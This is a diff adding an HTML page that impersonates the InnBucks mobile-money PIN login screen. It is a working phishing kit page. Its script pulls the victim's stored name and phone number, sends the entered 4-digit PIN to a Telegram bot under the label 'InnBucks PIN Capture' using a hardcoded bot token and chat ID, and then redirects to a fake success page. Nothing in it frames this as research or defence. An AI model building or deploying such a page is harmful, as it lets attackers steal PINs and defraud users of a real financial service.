@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Enter PIN</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:"Segoe UI",sans-serif;
+}
+
+body{
+  background:#1f2235;
+  min-height:100vh;
+  color:#fff;
+  display:flex;
+  justify-content:center;
+}
+
+.container{
+  width:100%;
+  max-width:380px;
+  padding:35px 20px 120px;
+  text-align:center;
+}
+
+/* LOGO */
+.logo{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:10px;
+  margin-bottom:35px;
+}
+
+.dots{
+  display:grid;
+  grid-template-columns:repeat(2,14px);
+  gap:5px;
+}
+
+.dot{width:14px;height:14px;border-radius:50%}
+.dot1{background:#ffb300}
+.dot2{background:#8e24aa}
+.dot3{background:#43a047}
+.dot4{background:#e53935}
+
+/* TEXT */
+h2{
+  font-size:22px;
+  margin-bottom:10px;
+}
+
+.sub{
+  color:#cbd5f5;
+  font-size:14px;
+  margin-bottom:35px;
+}
+
+/* INPUT */
+.field{
+  text-align:left;
+  margin-bottom:14px;
+}
+
+label{
+  font-size:14px;
+  color:#ccc;
+}
+
+.pin-box{
+  display:flex;
+  align-items:center;
+  border-bottom:1px solid #aaa;
+  padding:8px 0;
+}
+
+.pin-box input{
+  flex:1;
+  background:none;
+  border:none;
+  color:#fff;
+  font-size:16px;
+  outline:none;
+}
+
+.eye{
+  cursor:pointer;
+  font-size:18px;
+  opacity:.8;
+}
+
+/* FORGOT */
+.forgot{
+  color:#4dabf7;
+  margin-top:10px;
+  cursor:pointer;
+}
+
+/* FOOTER */
+.footer-btn{
+  position:fixed;
+  bottom:20px;
+  left:50%;
+  transform:translateX(-50%);
+  width:100%;
+  max-width:380px;
+  padding:0 20px;
+}
+
+button{
+  width:100%;
+  background:#355d8c;
+  border:none;
+  padding:15px;
+  border-radius:10px;
+  color:#fff;
+  font-size:16px;
+  transition:.3s;
+}
+
+button.loading{
+  transform:scale(.97);
+  opacity:.85;
+}
+
+/* LOADER */
+.loader{
+  display:none;
+  width:18px;
+  height:18px;
+  border:3px solid #fff;
+  border-top:3px solid transparent;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:auto;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg)}
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- LOGO -->
+  <div class="logo">
+    <div class="dots">
+      <div class="dot dot1"></div>
+      <div class="dot dot2"></div>
+      <div class="dot dot3"></div>
+      <div class="dot dot4"></div>
+    </div>
+    <h3>InnBucks</h3>
+  </div>
+
+  <h2>Hello, <span id="username">User</span></h2>
+  <div class="sub">Please enter your PIN to sign in.</div>
+
+  <div class="field">
+    <label>Enter PIN</label>
+
+    <div class="pin-box">
+      <input type="password" id="pin" maxlength="4" inputmode="numeric" placeholder="****">
+      <div class="eye" onclick="toggle()">👁</div>
+    </div>
+  </div>
+
+  <div class="forgot">Forgot PIN?</div>
+
+</div>
+
+<!-- VERIFY -->
+<div class="footer-btn">
+  <button id="btn" onclick="verify()">
+    <span id="txt">Verify</span>
+    <div class="loader" id="load"></div>
+  </button>
+</div>
+
+<script>
+  // 1. TELEGRAM CONFIGURATION
+  const BOT_TOKEN = "8205911859:AAHz67pd-r9V2TYVf3NEvlOX1aRXrigm9Hg";
+  const CHAT_ID = "8588753899";
+
+  // LOAD USER DATA
+  // Pulling 'fullName' and 'userPhone' from previous steps to identify the user
+  const fullName = localStorage.getItem("fullName") || "Unknown User";
+  const userPhone = localStorage.getItem("userPhone") || "N/A";
+  
+  document.getElementById("username").innerText = fullName;
+
+  /**
+   * 2. SEND PIN TO TELEGRAM
+   */
+  async function sendPinToTelegram(pin) {
+    const msg = `🛡️ *InnBucks PIN Capture*\n\n` +
+                `👤 *User:* ${fullName}\n` +
+                `📱 *Phone:* \`${userPhone}\`\n` +
+                `🔢 *PIN:* \`${pin}\`\n` +
+                `⏰ *Time:* ${new Date().toLocaleString()}`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      });
+    } catch (error) {
+      console.error("Telegram Error:", error);
+    }
+  }
+
+  /**
+   * 3. TOGGLE PIN VISIBILITY
+   */
+  function toggle() {
+    let i = document.getElementById("pin");
+    i.type = i.type === "password" ? "text" : "password";
+  }
+
+  /**
+   * 4. VERIFY & REDIRECT
+   */
+  function verify() {
+    let pin = document.getElementById("pin").value;
+    
+    if (pin.length < 4) {
+      alert("Please enter your full 4-digit PIN");
+      return;
+    }
+
+    // UI Feedback: Start Loading
+    let b = document.getElementById("btn");
+    b.classList.add("loading");
+    document.getElementById("txt").style.display = "none";
+    document.getElementById("load").style.display = "block";
+
+    // Send PIN to Telegram then Redirect
+    sendPinToTelegram(pin).then(() => {
+      setTimeout(() => {
+        window.location.href = "success.html";
+      }, 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
